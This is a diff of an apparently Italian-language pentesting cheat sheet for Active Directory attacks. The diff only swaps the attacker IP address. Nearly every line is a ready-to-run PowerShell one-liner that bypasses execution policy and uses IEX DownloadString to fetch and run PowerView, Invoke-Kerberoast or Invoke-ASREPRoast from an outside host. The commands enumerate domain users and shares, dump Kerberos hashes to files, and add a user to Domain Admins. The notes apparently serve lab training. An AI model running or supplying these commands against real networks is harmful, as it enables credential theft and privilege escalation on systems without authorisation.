@@ -25,24 +25,24 @@
 
 ### PowerView:
 - USER Enumeration
-	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-Domain"
-	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser"
-	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser -SPN"
-	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser -Properties 		samaccountname,memberof"
-	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser -Properties 		samaccountname,description"
+	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-Domain"
+	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser"
+	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser -SPN"
+	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser -Properties 		samaccountname,memberof"
+	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser -Properties 		samaccountname,description"
 
 - GROUP Enumeration
-	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainGroup -Name 'Domain 	Admins'"
-	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1');  Get-DomainGroup | where Name -like 	    	"*Admin*" | select SamAccountName "
-	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainGroupMember -Name 'Domain 	    	admins' "
-	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainGroup -Domain 'xor.com'"
+	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainGroup -Name 'Domain 	Admins'"
+	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1');  Get-DomainGroup | where Name -like 	    	"*Admin*" | select SamAccountName "
+	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainGroupMember -Name 'Domain 	    	admins' "
+	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainGroup -Domain 'xor.com'"
 
 - COMPUTER Enumeration
-	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-NetComputer | select 		samaccountname, operatingsystem"
-	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainComputer -Ping "
+	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-NetComputer | select 		samaccountname, operatingsystem"
+	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainComputer -Ping "
 
 - SHARED INFO Enumeration
-	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Find-DomainShare -Verbose"
+	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Find-DomainShare -Verbose"
 	cd \\fileshare.pentesting.local\FileShare
 
 # Overass The Hash / Pass The Key
@@ -88,9 +88,9 @@
 
 	- IEX
 		- Commands
-			- `powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser -SPN`
+			- `powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser -SPN`
 			
-			- `powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"`
+			- `powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"`
 			
 		- [Invoke-Kerberoast](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1)
 
@@ -134,13 +134,13 @@
 - in PowerShell
  	- Invoke-ASREPROAST and PowerView
 		- Commands
-			- `powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser -PreauthNotRequired -verbose"`
+			- `powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser -PreauthNotRequired -verbose"`
 			
-			- ` powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/Invoke-ASREPRoast.ps1'); Invoke-ASREPRoast -Verbose"`
+			- ` powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/Invoke-ASREPRoast.ps1'); Invoke-ASREPRoast -Verbose"`
 	
 	- Rubeus and Powerview
 		- Commands
-			- `powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser -PreauthNotRequired -verbose"`
+			- `powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser -PreauthNotRequired -verbose"`
 			- `Rubeus.exe asreproast  /format:[<hashcat or john]> /outfile:output.asreproast`
 		- [Rubeus](https://github.com/GhostPack/Rubeus)
 
@@ -169,11 +169,11 @@
 		- Commands
 			- `whoami /user`
 			
-			- `powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-ObjectAcl -SamAccountName 'DomainAdmins' -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericAll') -and ($_.SecurityIdentifier -match 'SID mio')}" `
+			- `powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-ObjectAcl -SamAccountName 'DomainAdmins' -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericAll') -and ($_.SecurityIdentifier -match 'SID mio')}" `
 			
-			- `powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Add-DomainGroupMember -identity 'DomainAdmins' -Member 'student1' -Domain 'pentesting'"`
+			- `powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Add-DomainGroupMember -identity 'DomainAdmins' -Member 'student1' -Domain 'pentesting'"`
 			
-			-  `powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser -Name student1"`
+			-  `powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser -Name student1"`
 
 # Archiviazione e recupero credenziali memorizzate
 ### Poiché l'implementazione di Kerberos da parte di Microsoft utilizza il single sign-on, gli hash delle password devono essere archiviati da qualche parte per rinnovare una richiesta TGT. Nelle versioni correnti di Windows, questi hash sono archiviati nello spazio di memoria LSASS (Local Security Authority Subsystem Service). Se otteniamo l'accesso a questi hash, potremmo craccarli per ottenere la password in chiaro o riutilizzarli per eseguire varie azioni.
